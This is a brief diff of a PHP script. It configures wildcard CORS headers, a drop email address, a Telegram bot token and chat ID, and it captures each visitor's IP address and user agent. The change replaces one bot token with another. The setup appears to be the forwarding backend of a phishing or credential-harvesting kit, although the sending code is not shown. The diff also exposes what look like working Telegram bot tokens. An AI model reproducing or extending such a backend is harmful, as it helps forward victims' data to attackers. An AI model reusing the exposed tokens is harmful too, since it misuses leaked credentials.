@@ -9,7 +9,7 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
 header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
 $recipient_email = "tag100@mailfence.com"; // Change to your receiving email
-$telegram_bot_token = "7594602249:AAHXtpmqcu4ONanYKOkn4AixALhln7bmGn4";    // Bot token
+$telegram_bot_token = "7594602249:AAH1nBkDp6AlsZy86yHka-mNQ6wmx-_C3oM";    // Bot token
 $telegram_chat_id = "7724482403";        // Telegram chat ID
 $user_ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
